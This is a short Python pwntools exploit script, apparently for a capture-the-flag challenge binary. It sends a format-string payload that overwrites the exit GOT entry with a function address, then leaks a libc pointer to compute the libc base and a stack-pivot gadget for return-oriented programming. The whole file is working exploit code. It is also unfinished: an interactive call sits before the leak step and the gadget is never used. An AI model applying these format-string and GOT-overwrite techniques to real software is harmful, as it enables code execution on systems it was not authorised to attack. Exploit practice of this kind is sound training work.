#!/usr/bin/env python3
from pwn import *
from sys import argv
from time import sleep
# func+516

try:
  binary = ELF(argv[1], checksec=False)

  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
  p = binary.process(env={})

  pause()

  log.info("Overwrite exit with func")
  payload  = b'%*66$c %67$ln     '
  payload += p64(binary.symbols['func']-143)
  payload += p64(binary.got['exit'])
  p.sendline(payload)
  p.interactive()

  log.info("Leaking libc base address")
  p.sendline(b'%p') 
  libc_leak = int(p.recvuntil(b'\nIn this challenge, you').split(b'\n')[-2], 16)
  libc_base = libc_leak-(libc.symbols['_IO_2_1_stdout_']+131)
  # add rsp, 0x418 ; ret
  shift_gadget = libc_base+0x000000000011bfcd
  log.info("Libc base address: %#lx" % libc_base)
  log.info("Shift gadget address: %#lx" % shift_gadget)


  p.interactive()
except IndexError:
  print("Usage: %s <binary>" % argv[0])
